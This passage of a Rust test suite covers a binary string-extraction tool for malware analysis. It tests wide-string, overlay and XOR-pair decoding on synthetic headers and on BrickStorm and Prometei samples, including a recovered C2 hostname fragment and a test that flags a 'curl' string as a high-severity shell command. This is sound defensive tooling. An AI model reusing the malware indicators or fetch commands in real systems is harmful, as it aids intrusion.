    fn test_options_default_no_filter() {
        let opts = ExtractOptions::new(4);
        assert!(!opts.filter_garbage);
    }

    #[test]
    fn test_options_with_filter() {
        let opts = ExtractOptions::new(4).with_garbage_filter(true);
        assert!(opts.filter_garbage);
    }
}

mod edge_case_tests {
    use super::*;

    #[test]
    fn test_extract_with_zero_min_length() {
        let data = minimal_elf_header();
        let strings = extract_strings(&data, 0);
        // With min_length 0, may extract empty/single-char strings from binary
        // Just verify it doesn't panic
        let _ = strings;
    }

    #[test]
    fn test_extract_with_large_min_length() {
        let data = minimal_elf_header();
        let strings = extract_strings(&data, 1000);
        assert!(strings.is_empty());
    }

    #[test]
    fn test_string_kind_debug() {
        let kinds = vec![
            StringKind::Const,
            StringKind::FuncName,
            StringKind::FilePath,
            StringKind::EnvVar,
            StringKind::Error,
            StringKind::Url,
            StringKind::Path,
            StringKind::Section,
            StringKind::Ident,
            StringKind::Arg,
            StringKind::MapKey,
            StringKind::Import,
            StringKind::Export,
        ];
        for kind in kinds {
            let s = format!("{:?}", kind);
            assert!(!s.is_empty());
        }
    }

    #[test]
    fn test_string_method_debug() {
        let methods = vec![
            StringMethod::Structure,
            StringMethod::InstructionPattern,
            StringMethod::RawScan,
            StringMethod::Heuristic,
            StringMethod::R2String,
            StringMethod::R2Symbol,
        ];
        for method in methods {
            let s = format!("{:?}", method);
            assert!(!s.is_empty());
        }
    }

    #[test]
    fn test_extract_options_builder_pattern() {
        let opts = ExtractOptions::new(5).with_r2("/some/path");
        assert_eq!(opts.min_length, 5);
        assert!(opts.use_r2);
        assert_eq!(opts.path, Some("/some/path".to_string()));
    }

    #[test]
    fn test_extracted_string_equality() {
        let s1 = ExtractedString {
            value: "test".to_string(),
            data_offset: 0x1000,
            section: Some("test".to_string()),
            method: StringMethod::Structure,
            kind: StringKind::Const,
            library: None,
            fragments: None,
            ..Default::default()
        };
        let s2 = ExtractedString {
            value: "test".to_string(),
            data_offset: 0x1000,
            section: Some("test".to_string()),
            method: StringMethod::Structure,
            kind: StringKind::Const,
            library: None,
            fragments: None,
            ..Default::default()
        };
        // Clone check
        let s3 = s1.clone();
        assert_eq!(s1.value, s2.value);
        assert_eq!(s1.value, s3.value);
    }

    #[test]
    fn test_is_garbage_edge_cases() {
        // Null bytes
        assert!(is_garbage("ab\0cd"));
        // Tabs are treated as garbage
        assert!(is_garbage("hello\tworld"));
        // Newlines are also garbage
        assert!(is_garbage("hello\nworld"));
        // Non-ASCII unicode is treated as garbage (binary artifacts)
        assert!(is_garbage("héllo wörld"));
        // ASCII strings are fine
        assert!(!is_garbage("hello world"));
        // Very long string (all same char is garbage)
        let long = "a".repeat(10000);
        assert!(is_garbage(&long));
        // Long varied string is not garbage
        let varied = "hello world this is a longer test string";
        assert!(!is_garbage(varied));
    }

    #[test]
    fn test_minimal_pe_header() {
        // Create minimal PE header
        let mut data = vec![0u8; 512];
        // DOS header magic
        data[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ
                                                   // PE offset at 0x3C
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]);
        // PE signature at 0x80
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // This is a minimal/invalid PE, should return empty
        let strings = extract_strings(&data, 4);
        assert!(strings.is_empty());
    }
}

/// Tests for UTF-16LE wide string extraction (Windows binaries)
mod wide_string_tests {
    use super::*;

    /// Helper to encode a string as UTF-16LE with null terminator
    fn to_utf16le_null(s: &str) -> Vec<u8> {
        let mut bytes = Vec::new();
        for c in s.encode_utf16() {
            bytes.extend_from_slice(&c.to_le_bytes());
        }
        bytes.extend_from_slice(&[0x00, 0x00]);
        bytes
    }

    /// Helper to create a minimal PE with embedded wide strings
    fn minimal_pe_with_wide_strings(wide_strings: &[&str]) -> Vec<u8> {
        let mut data = vec![0u8; 1024];

        // DOS header magic
        data[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ

        // PE offset at 0x3C
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]);

        // PE signature at 0x80
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // COFF header (20 bytes) at 0x84
        data[0x84..0x86].copy_from_slice(&[0x64, 0x86]); // Machine: AMD64
        data[0x86..0x88].copy_from_slice(&[0x01, 0x00]); // NumberOfSections: 1
        data[0x94..0x96].copy_from_slice(&[0xF0, 0x00]); // SizeOfOptionalHeader
        data[0x96..0x98].copy_from_slice(&[0x22, 0x00]); // Characteristics

        // Optional header at 0x98
        data[0x98..0x9A].copy_from_slice(&[0x0B, 0x02]); // PE32+ magic

        // Embed wide strings starting at offset 0x200
        let mut offset = 0x200;
        for s in wide_strings {
            let encoded = to_utf16le_null(s);
            if offset + encoded.len() <= data.len() {
                data[offset..offset + encoded.len()].copy_from_slice(&encoded);
                offset += encoded.len();
            }
        }

        data
    }

    #[test]
    fn test_wide_string_method_exists() {
        // Verify the WideString method variant is available
        let method = StringMethod::WideString;
        assert_eq!(format!("{:?}", method), "WideString");
    }

    #[test]
    fn test_pe_with_embedded_wide_strings() {
        // Use the real Windows binary which is a valid PE
        let path = std::path::Path::new("tests/testdata/hello_windows.exe");
        if !path.exists() {
            return; // Skip if test data not available
        }

        let data = std::fs::read(path).expect("Failed to read test binary");
        let strings = extract_strings(&data, 4);

        // Should find wide strings in a real Windows PE
        let wide_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::WideString)
            .collect();

        // Real Windows binaries have wide strings
        // (count may vary but extraction should work without error)
        println!(
            "Found {} wide strings in PE, total {} strings",
            wide_strings.len(),
            strings.len()
        );
    }

    #[test]
    fn test_wide_strings_have_correct_method() {
        let data = minimal_pe_with_wide_strings(&["TestString"]);
        let strings = extract_strings(&data, 4);

        let wide_strings: Vec<_> = strings.iter().filter(|s| s.value == "TestString").collect();

        if !wide_strings.is_empty() {
            assert_eq!(
                wide_strings[0].method,
                StringMethod::WideString,
                "Wide string should have WideString method"
            );
        }
    }

    #[test]
    fn test_real_windows_binary_wide_strings() {
        // Test with the real Windows Go binary in testdata
        let path = std::path::Path::new("tests/testdata/hello_windows.exe");
        if !path.exists() {
            return; // Skip if test data not available
        }

        let data = std::fs::read(path).expect("Failed to read test binary");
        let strings = extract_strings(&data, 4);

        // Count wide strings
        let wide_count = strings
            .iter()
            .filter(|s| s.method == StringMethod::WideString)
            .count();

        // Windows binaries typically have some wide strings
        // (Go binaries may have fewer, but should still have some from runtime)
        println!("Found {} wide strings in hello_windows.exe", wide_count);

        // The test passes as long as extraction completes without error
        // Wide string count may vary based on binary content
    }

    #[test]
    fn test_wide_strings_classified_correctly() {
        let data = minimal_pe_with_wide_strings(&[
            "https://example.com",
            "C:\\Users\\Test",
            "HKEY_LOCAL_MACHINE\\SOFTWARE",
        ]);

        let strings = extract_strings(&data, 4);

        // Check URL classification
        if let Some(url) = strings.iter().find(|s| s.value.contains("example.com")) {
            assert_eq!(url.kind, StringKind::Url, "URL should be classified as Url");
        }

        // Check path classification
        if let Some(path) = strings.iter().find(|s| s.value.contains("Users")) {
            assert_eq!(
                path.kind,
                StringKind::Path,
                "Windows path should be classified as Path"
            );
        }

        // Check registry classification
        if let Some(reg) = strings.iter().find(|s| s.value.contains("HKEY_")) {
            assert_eq!(
                reg.kind,
                StringKind::Registry,
                "Registry path should be classified as Registry"
            );
        }
    }

    #[test]
    fn test_wide_strings_with_garbage_filter() {
        let data = minimal_pe_with_wide_strings(&["ValidString", "Test1234"]);

        let opts = ExtractOptions::new(4).with_garbage_filter(true);
        let strings = extract_strings_with_options(&data, &opts);

        // Valid strings should pass garbage filter
        let wide_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::WideString)
            .collect();

        // Garbage filter should not remove legitimate wide strings
        for s in &wide_strings {
            assert!(
                !is_garbage(&s.value),
                "Wide string '{}' should not be garbage",
                s.value
            );
        }
    }

    #[test]
    fn test_wide_string_min_length() {
        // Test min_length filtering with the real Windows binary
        let path = std::path::Path::new("tests/testdata/hello_windows.exe");
        if !path.exists() {
            return;
        }

        let data = std::fs::read(path).expect("Failed to read test binary");

        // Extract with min_length=4
        let strings_short = extract_strings(&data, 4);
        let wide_short: Vec<_> = strings_short
            .iter()
            .filter(|s| s.method == StringMethod::WideString)
            .collect();

        // Extract with min_length=10
        let strings_long = extract_strings(&data, 10);
        let wide_long: Vec<_> = strings_long
            .iter()
            .filter(|s| s.method == StringMethod::WideString)
            .collect();

        // Higher min_length should result in fewer or equal wide strings
        assert!(
            wide_long.len() <= wide_short.len(),
            "Higher min_length should filter more strings"
        );

        // All wide strings should meet min_length requirement
        for s in &wide_long {
            assert!(
                s.value.len() >= 10,
                "Wide string '{}' should be >= 10 chars",
                s.value
            );
        }
    }

    #[test]
    fn test_wide_strings_deduplication() {
        let data = minimal_pe_with_wide_strings(&["Duplicate", "Duplicate", "Unique"]);

        let strings = extract_strings(&data, 4);

        // Should only have one "Duplicate"
        let dup_count = strings.iter().filter(|s| s.value == "Duplicate").count();
        assert!(dup_count <= 1, "Duplicate strings should be deduplicated");
    }

    #[test]
    fn test_wide_strings_offset_tracking() {
        let data = minimal_pe_with_wide_strings(&["FirstString"]);

        let strings = extract_strings(&data, 4);

        if let Some(s) = strings.iter().find(|s| s.value == "FirstString") {
            // Offset should be >= 0x200 (where we embedded the string)
            assert!(
                s.data_offset >= 0x200,
                "Wide string offset should reflect position in binary"
            );
        }
    }
}

/// Tests for IP detection improvements (filtering version numbers)
mod ip_detection_tests {
    use super::*;
    use stng::Severity;

    /// Helper to create a minimal PE with embedded ASCII strings
    fn minimal_pe_with_strings(strings: &[&str]) -> Vec<u8> {
        let mut data = vec![0u8; 1024];

        // DOS header magic
        data[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ

        // PE offset at 0x3C
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]);

        // PE signature at 0x80
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // Embed strings starting at 0x200
        let mut offset = 0x200;
        for s in strings {
            let bytes = s.as_bytes();
            data[offset..offset + bytes.len()].copy_from_slice(bytes);
            data[offset + bytes.len()] = 0; // null terminator
            offset += bytes.len() + 1;
        }

        data
    }

    #[test]
    fn test_real_ip_classified_as_ip() {
        // Create binary with a real IP address embedded
        let data = minimal_pe_with_strings(&["168.235.103.57"]);

        let strings = extract_strings(&data, 4);
        let ip_string = strings.iter().find(|s| s.value == "168.235.103.57");

        assert!(ip_string.is_some(), "Real IP should be extracted");
        assert_eq!(
            ip_string.unwrap().kind,
            StringKind::IP,
            "Real IP should be classified as IP"
        );
    }

    #[test]
    fn test_version_number_not_ip() {
        // Create binary with version numbers (should NOT be IPs)
        let data = minimal_pe_with_strings(&["1.0.0.0"]);

        let strings = extract_strings(&data, 4);
        let version_string = strings.iter().find(|s| s.value == "1.0.0.0");

        // Should either not be found or not be classified as IP
        if let Some(s) = version_string {
            assert_ne!(
                s.kind,
                StringKind::IP,
                "Version number 1.0.0.0 should NOT be classified as IP"
            );
        }
    }

    #[test]
    fn test_version_pattern_x_y_0_0_not_ip() {
        // Pattern X.Y.0.0 should not be IP
        let data = minimal_pe_with_strings(&["4.5.0.0"]);

        let strings = extract_strings(&data, 4);
        let version_string = strings.iter().find(|s| s.value == "4.5.0.0");

        if let Some(s) = version_string {
            assert_ne!(
                s.kind,
                StringKind::IP,
                "Version number 4.5.0.0 should NOT be classified as IP"
            );
        }
    }

    #[test]
    fn test_ip_has_high_severity() {
        // IPs should have high severity
        let data = minimal_pe_with_strings(&["8.8.8.8"]);

        let strings = extract_strings(&data, 4);
        let ip_string = strings.iter().find(|s| s.value == "8.8.8.8");

        if let Some(s) = ip_string {
            assert_eq!(
                s.kind.severity(),
                Severity::High,
                "IP addresses should have High severity"
            );
        }
    }

    #[test]
    fn test_ip_severity_higher_priority_than_url() {
        // IPs should sort before URLs when prioritizing notable items
        // This tests the severity ordering used in main.rs Notable section
        let ip_severity = StringKind::IP.severity();
        let url_severity = StringKind::Url.severity();

        // Both are High, but we test the ordering logic in main.rs
        assert_eq!(ip_severity, Severity::High);
        assert_eq!(url_severity, Severity::High);
    }
}

/// Tests for shell command detection improvements (filtering .NET generics)
mod shell_detection_tests {
    use super::*;

    /// Helper to create a minimal PE with embedded ASCII strings
    fn minimal_pe_with_strings(strings: &[&str]) -> Vec<u8> {
        let mut data = vec![0u8; 1024];

        // DOS header magic
        data[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ

        // PE offset at 0x3C
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]);

        // PE signature at 0x80
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // Embed strings starting at 0x200
        let mut offset = 0x200;
        for s in strings {
            let bytes = s.as_bytes();
            data[offset..offset + bytes.len()].copy_from_slice(bytes);
            data[offset + bytes.len()] = 0; // null terminator
            offset += bytes.len() + 1;
        }

        data
    }

    #[test]
    fn test_dotnet_generic_not_shell_command() {
        // .NET generics with backticks should NOT be shell commands
        let data = minimal_pe_with_strings(&["IEnumerable`1"]);

        let strings = extract_strings(&data, 4);
        let generic_string = strings.iter().find(|s| s.value == "IEnumerable`1");

        if let Some(s) = generic_string {
            assert_ne!(
                s.kind,
                StringKind::ShellCmd,
                "IEnumerable`1 should NOT be classified as shell command"
            );
        }
    }

    #[test]
    fn test_dictionary_generic_not_shell_command() {
        let data = minimal_pe_with_strings(&["Dictionary`2"]);

        let strings = extract_strings(&data, 4);
        let generic_string = strings.iter().find(|s| s.value == "Dictionary`2");

        if let Some(s) = generic_string {
            assert_ne!(
                s.kind,
                StringKind::ShellCmd,
                "Dictionary`2 should NOT be classified as shell command"
            );
        }
    }

    #[test]
    fn test_real_shell_command_detected() {
        // Real shell commands should be detected
        let data = minimal_pe_with_strings(&["curl http://example.com"]);

        let strings = extract_strings(&data, 4);
        let cmd_string = strings
            .iter()
            .find(|s| s.value == "curl http://example.com");

        assert!(cmd_string.is_some(), "Shell command should be extracted");
        assert_eq!(
            cmd_string.unwrap().kind,
            StringKind::ShellCmd,
            "curl command should be classified as shell command"
        );
    }

    #[test]
    fn test_pipe_command_detected() {
        let data = minimal_pe_with_strings(&["cat file | grep pattern"]);

        let strings = extract_strings(&data, 4);
        let cmd_string = strings
            .iter()
            .find(|s| s.value == "cat file | grep pattern");

        if let Some(s) = cmd_string {
            assert_eq!(
                s.kind,
                StringKind::ShellCmd,
                "Pipe command should be classified as shell command"
            );
        }
    }

    #[test]
    fn test_shell_command_has_high_severity() {
        use stng::Severity;

        assert_eq!(
            StringKind::ShellCmd.severity(),
            Severity::High,
            "Shell commands should have High severity"
        );
    }
}

// Tests for extraction and overlay detection
mod extract_from_tests {
    use stng::{
        detect_elf_overlay, extract_overlay_strings, extract_strings_with_options, ExtractOptions,
    };

    fn minimal_elf_with_strings(strings: &[&str]) -> Vec<u8> {
        let mut data = vec![0u8; 1024];
        // ELF magic
        data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        data[4] = 2; // 64-bit
        data[5] = 1; // little-endian
        data[6] = 1; // version
        data[16..18].copy_from_slice(&[2, 0]); // executable
        data[18..20].copy_from_slice(&[0x3E, 0]); // x86_64

        // Embed strings starting at 0x200
        let mut offset = 0x200;
        for s in strings {
            let bytes = s.as_bytes();
            data[offset..offset + bytes.len()].copy_from_slice(bytes);
            data[offset + bytes.len()] = 0;
            offset += bytes.len() + 1;
        }

        // Trim to actual used size to avoid false overlay detection
        data.truncate(offset);
        data
    }

    fn minimal_macho_with_strings(strings: &[&str]) -> Vec<u8> {
        let mut data = vec![0u8; 1024];
        // Mach-O 64-bit magic
        data[0..4].copy_from_slice(&[0xCF, 0xFA, 0xED, 0xFE]);
        data[4..8].copy_from_slice(&[0x07, 0x00, 0x00, 0x01]); // x86_64
        data[8..12].copy_from_slice(&[0x03, 0x00, 0x00, 0x00]); // subtype
        data[12..16].copy_from_slice(&[0x02, 0x00, 0x00, 0x00]); // executable

        // Embed strings starting at 0x200
        let mut offset = 0x200;
        for s in strings {
            let bytes = s.as_bytes();
            data[offset..offset + bytes.len()].copy_from_slice(bytes);
            data[offset + bytes.len()] = 0;
            offset += bytes.len() + 1;
        }
        data
    }

    fn minimal_pe_with_overlay(overlay_data: &[u8]) -> Vec<u8> {
        let mut data = vec![0u8; 1024];
        // DOS header
        data[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]); // PE offset

        // PE signature
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // COFF header (20 bytes)
        data[0x84..0x86].copy_from_slice(&[0x64, 0x86]); // Machine: AMD64
        data[0x86..0x88].copy_from_slice(&[0x01, 0x00]); // NumberOfSections: 1
        data[0x94..0x96].copy_from_slice(&[0xF0, 0x00]); // SizeOfOptionalHeader: 240

        // Optional header
        data[0x98..0x9A].copy_from_slice(&[0x0B, 0x02]); // Magic: PE32+
                                                         // SizeOfHeaders at offset 0x98 + 60 = 0xD4
        data[0xD4..0xD8].copy_from_slice(&[0x00, 0x02, 0x00, 0x00]); // SizeOfHeaders: 512

        // Section header at 0x188 (after optional header)
        // .text section
        data[0x188..0x190].copy_from_slice(b".text\0\0\0");
        // VirtualSize
        data[0x190..0x194].copy_from_slice(&[0x00, 0x02, 0x00, 0x00]); // 512
                                                                       // VirtualAddress
        data[0x194..0x198].copy_from_slice(&[0x00, 0x10, 0x00, 0x00]); // 0x1000
                                                                       // SizeOfRawData
        data[0x198..0x19C].copy_from_slice(&[0x00, 0x02, 0x00, 0x00]); // 512
                                                                       // PointerToRawData
        data[0x19C..0x1A0].copy_from_slice(&[0x00, 0x02, 0x00, 0x00]); // 512

        // Section data starts at 512, ends at 1024
        // Append overlay data
        data.extend_from_slice(overlay_data);
        data
    }

    #[test]
    fn test_extract_from_elf_basic() {
        let data = minimal_elf_with_strings(&["hello_from_elf", "test_string_elf"]);
        let opts = ExtractOptions::new(4);

        let strings = extract_strings_with_options(&data, &opts);

        // Should find some strings (at minimum from raw scan)
        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        assert!(
            values
                .iter()
                .any(|v| v.contains("hello") || v.contains("test")),
            "Should extract strings from ELF: {:?}",
            values
        );
    }

    #[test]
    fn test_extract_from_macho_basic() {
        let data = minimal_macho_with_strings(&["hello_from_macho", "test_string_macho"]);
        let opts = ExtractOptions::new(4);

        let strings = extract_strings_with_options(&data, &opts);

        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        assert!(
            values
                .iter()
                .any(|v| v.contains("hello") || v.contains("test")),
            "Should extract strings from Mach-O: {:?}",
            values
        );
    }

    #[test]
    fn test_extract_from_pe_basic() {
        let mut data = vec![0u8; 1024];
        // DOS header
        data[0..2].copy_from_slice(&[0x4D, 0x5A]);
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]);
        // PE signature
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]);
        // Add strings
        data[0x200..0x210].copy_from_slice(b"hello_from_pe\0\0\0");

        let opts = ExtractOptions::new(4);

        let strings = extract_strings_with_options(&data, &opts);

        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        assert!(
            values.iter().any(|v| v.contains("hello")),
            "Should extract strings from PE: {:?}",
            values
        );
    }

    #[test]
    fn test_extract_overlay_strings_basic() {
        // Create PE with overlay containing strings
        let overlay = b"OVERLAY_SECRET_STRING\0more_overlay_data\0";
        let data = minimal_pe_with_overlay(overlay);

        let strings = extract_overlay_strings(&data, 4);

        // May or may not find overlay depending on PE parsing
        // This exercises the code path
        let _ = strings;
    }

    #[test]
    fn test_detect_elf_overlay_no_overlay() {
        let data = minimal_elf_with_strings(&["test"]);
        let overlay = detect_elf_overlay(&data);
        // Minimal ELF without proper section headers will have data treated as overlay
        // Just verify the detection doesn't crash and returns reasonable results
        if let Some(o) = overlay {
            assert!(o.start_offset >= 64); // Should start after ELF header
            assert!(o.size < data.len() as u64); // Should be less than total file size
        }
    }

    #[test]
    #[ignore] // Only run when debugging specific binary
    fn test_real_overlay_uplugplay() {
        use std::fs;
        let data =
            fs::read("/Users/t/data/dissect/malware/elf_linux/2026.Prometei/uplugplay").unwrap();

        // Detect overlay
        if let Some(overlay) = detect_elf_overlay(&data) {
            println!(
                "Overlay: start=0x{:x}, size={}",
                overlay.start_offset, overlay.size
            );

            // Extract overlay strings
            let strings = extract_overlay_strings(&data, 4);
            println!("Extracted {} overlay strings", strings.len());

            for s in &strings {
                println!(
                    "  0x{:x}: {} (len={})",
                    s.data_offset,
                    s.value,
                    s.value.len()
                );
            }

            // Look for the JSON config string
            let has_config = strings.iter().any(|s| s.value.contains("config"));
            println!("Has 'config' string: {}", has_config);
        }
    }

    #[test]
    fn test_overlay_string_offsets_are_absolute() {
        // Create a minimal ELF that ends at a known offset
        let mut data = vec![0u8; 1024];
        // ELF magic
        data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        data[4] = 2; // 64-bit
        data[5] = 1; // little-endian
        data[6] = 1; // version
        data[16..18].copy_from_slice(&[2, 0]); // executable
        data[18..20].copy_from_slice(&[0x3E, 0]); // x86_64

        // Set e_shoff (section header offset) to 512
        data[40..48].copy_from_slice(&[0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        // Set e_shnum (section header count) to 1
        data[60..62].copy_from_slice(&[0x01, 0x00]);
        // Set e_shentsize (section header entry size) to 64
        data[58..60].copy_from_slice(&[0x40, 0x00]);

        // Section header at offset 512 (0x200)
        // This section ends at offset 512 + 64 = 576 (0x240)
        let section_header_start = 512;
        data[section_header_start..section_header_start + 4]
            .copy_from_slice(&[0x01, 0x00, 0x00, 0x00]); // sh_name
        data[section_header_start + 4..section_header_start + 8]
            .copy_from_slice(&[0x01, 0x00, 0x00, 0x00]); // sh_type

        // ELF structure ends at 576 (0x240)
        let elf_end = 576;

        // Append overlay data starting at offset 576 (0x240)
        // Add some padding to reach exactly 576 bytes
        data.truncate(elf_end);

        // Add overlay strings at known positions
        // First string "OVERLAY_TEST_AAA" starts at offset 576 (0x240)
        let overlay_start = data.len();
        data.extend_from_slice(b"OVERLAY_TEST_AAA\0");
        let first_string_offset = overlay_start;

        // Second string "OVERLAY_TEST_BBB" starts at offset 593 (0x251)
        data.extend_from_slice(b"OVERLAY_TEST_BBB\0");
        let second_string_offset = overlay_start + 17;

        // Extract overlay strings
        let strings = extract_overlay_strings(&data, 4);

        // Verify we found the strings
        assert!(!strings.is_empty(), "Should find overlay strings");

        // Find our test strings
        let test_aaa = strings
            .iter()
            .find(|s| s.value.contains("OVERLAY_TEST_AAA"));
        let test_bbb = strings
            .iter()
            .find(|s| s.value.contains("OVERLAY_TEST_BBB"));

        // Verify offsets are absolute file offsets, not relative to overlay start
        if let Some(s) = test_aaa {
            assert_eq!(
                s.data_offset as usize, first_string_offset,
                "First overlay string offset should be absolute file offset 0x{:x}, not relative to overlay",
                first_string_offset
            );
            assert_eq!(
                s.kind,
                stng::StringKind::Overlay,
                "Should be marked as overlay"
            );
        } else {
            panic!("Should find OVERLAY_TEST_AAA string");
        }

        if let Some(s) = test_bbb {
            assert_eq!(
                s.data_offset as usize, second_string_offset,
                "Second overlay string offset should be absolute file offset 0x{:x}, not relative to overlay",
                second_string_offset
            );
            assert_eq!(
                s.kind,
                stng::StringKind::Overlay,
                "Should be marked as overlay"
            );
        } else {
            panic!("Should find OVERLAY_TEST_BBB string");
        }
    }

    #[test]
    fn test_extract_from_elf_with_garbage_filter() {
        let data = minimal_elf_with_strings(&["valid_string", "@@##$$"]);
        let mut opts = ExtractOptions::new(4);
        opts.filter_garbage = true;

        let strings = extract_strings_with_options(&data, &opts);

        // Garbage filter should remove noise
        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        assert!(!values.contains(&"@@##$$"), "Garbage should be filtered");
    }

    #[test]
    fn test_extract_from_macho_with_garbage_filter() {
        let data = minimal_macho_with_strings(&["valid_string", "@@##$$"]);
        let mut opts = ExtractOptions::new(4);
        opts.filter_garbage = true;

        let strings = extract_strings_with_options(&data, &opts);

        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        assert!(!values.contains(&"@@##$$"), "Garbage should be filtered");
    }

    #[test]
    fn test_extract_from_pe_with_garbage_filter() {
        let mut data = vec![0u8; 1024];
        data[0..2].copy_from_slice(&[0x4D, 0x5A]);
        data[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]);
        data[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]);
        data[0x200..0x210].copy_from_slice(b"valid_string\0\0\0\0");

        let mut opts = ExtractOptions::new(4);
        opts.filter_garbage = true;

        let strings = extract_strings_with_options(&data, &opts);

        // Just exercise the code path
        let _ = strings;
    }
}

// Tests for real binaries in testdata
mod testdata_binary_tests {
    use std::path::Path;
    use stng::{extract_strings_with_options, ExtractOptions, StringKind};

    #[test]
    fn test_linux_elf_imports() {
        let path = Path::new("tests/testdata/hello_linux_amd64");
        if !path.exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();
        let opts = ExtractOptions::new(4);

        let strings = extract_strings_with_options(&data, &opts);

        // Should have some imports
        let _imports: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Import)
            .collect();

        // Go binaries may not have traditional imports, but should have strings
        assert!(!strings.is_empty(), "Should extract strings from ELF");
    }

    #[test]
    fn test_windows_pe_extraction() {
        let path = Path::new("tests/testdata/hello_windows.exe");
        if !path.exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();
        let opts = ExtractOptions::new(4);

        let strings = extract_strings_with_options(&data, &opts);

        assert!(!strings.is_empty(), "Should extract strings from PE");

        // Check for common Go runtime strings
        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        let has_runtime = values
            .iter()
            .any(|v| v.contains("runtime") || v.contains("go"));
        assert!(has_runtime, "Go PE should have runtime strings");
    }

    #[test]
    fn test_linux_elf_with_min_length() {
        let path = Path::new("tests/testdata/hello_linux_amd64");
        if !path.exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();

        let opts_short = ExtractOptions::new(4);
        let opts_long = ExtractOptions::new(20);

        let strings_short = extract_strings_with_options(&data, &opts_short);
        let strings_long = extract_strings_with_options(&data, &opts_long);

        assert!(
            strings_long.len() <= strings_short.len(),
            "Longer min_length should produce fewer strings"
        );
    }

    /// End-to-end test against the BrickStorm/garble-obfuscated ELF malware sample.
    ///
    /// Verifies that XOR-pair extraction recovers known strings from the binary,
    /// including environment variable lookups, the C2 hostname, and multi-chunk
    /// merged results longer than a single 8-byte encoding chunk.
    #[test]
    fn test_brickstorm_xor_pair_extraction() {
        use stng::StringMethod;

        let path = Path::new("tests/testdata/brickstorm_linux_amd64");
        if !path.exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();
        let opts = ExtractOptions::new(4);

        let strings = extract_strings_with_options(&data, &opts);
        let xor: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::XorStackPair)
            .collect();

        assert!(
            !xor.is_empty(),
            "expected XorStackPair results from BrickStorm binary"
        );

        let values: Vec<&str> = xor.iter().map(|s| s.value.as_str()).collect();

        // Environment variable lookups observed in the wild.
        for expected in &["PATH", "HOME", "TERM"] {
            assert!(
                values.contains(expected),
                "expected env var {expected:?} in XOR-pair results"
            );
        }

        // C2 hostname fragment — characteristic of this sample.
        assert!(
            values.iter().any(|v| v.contains("systemsvcs")),
            "expected C2 hostname fragment containing 'systemsvcs'"
        );

        // Multi-chunk merging: at least one result longer than one 8-byte chunk.
        let max_len = xor.iter().map(|s| s.value.len()).max().unwrap_or(0);
        assert!(
            max_len > 8,
            "expected at least one merged multi-chunk result (got max len {max_len})"
        );
    }
}

// Tests for edge cases in common.rs
mod common_edge_cases {
    use stng::is_garbage;

    #[test]
    fn test_is_garbage_path_separators() {
        // Paths with multiple separators
        assert!(!is_garbage("/usr/local/bin/test"));
        assert!(!is_garbage("C:\\Windows\\System32\\cmd.exe"));
    }

    #[test]
    fn test_is_garbage_format_strings() {
        // Printf-style format strings should not be garbage
        assert!(!is_garbage("Error: %s at line %d"));
        assert!(!is_garbage("Processing %d of %d items"));
    }

    #[test]
    fn test_is_garbage_urls() {
        assert!(!is_garbage("https://example.com/path"));
        assert!(!is_garbage("http://localhost:8080"));
    }

    #[test]
    fn test_is_garbage_json_like() {
        assert!(!is_garbage("{\"key\": \"value\"}"));
        // Short strings with punctuation are filtered
        assert!(is_garbage("[1, 2, 3]"));
    }

    #[test]
    fn test_is_garbage_boundary_cases() {
        // Very short strings
        assert!(is_garbage("a")); // 1 char is garbage
                                  // 2-3 char strings can be valid identifiers
        assert!(!is_garbage("ab"));
        assert!(!is_garbage("abc"));

        // Exactly at boundary
        assert!(!is_garbage("test")); // 4 chars, should be ok if valid
    }

    #[test]
    fn test_is_garbage_whitespace_variations() {
        // Leading/trailing whitespace
        assert!(!is_garbage("  hello world  "));
        // Tabs are control characters and filtered
        assert!(is_garbage("hello\tworld"));
    }

    #[test]
    fn test_is_garbage_numeric_strings() {
        // Short strings with dots are filtered as noise punctuation
        assert!(is_garbage("1.2.3"));
        assert!(!is_garbage("v2.0.0"));
        // Hex addresses
        assert!(!is_garbage("0x12345678"));
    }
}

// Tests for StringKind classification edge cases
mod string_kind_tests {
    use stng::{extract_strings, StringKind, StringMethod};

    fn minimal_elf_with_string(s: &str) -> Vec<u8> {
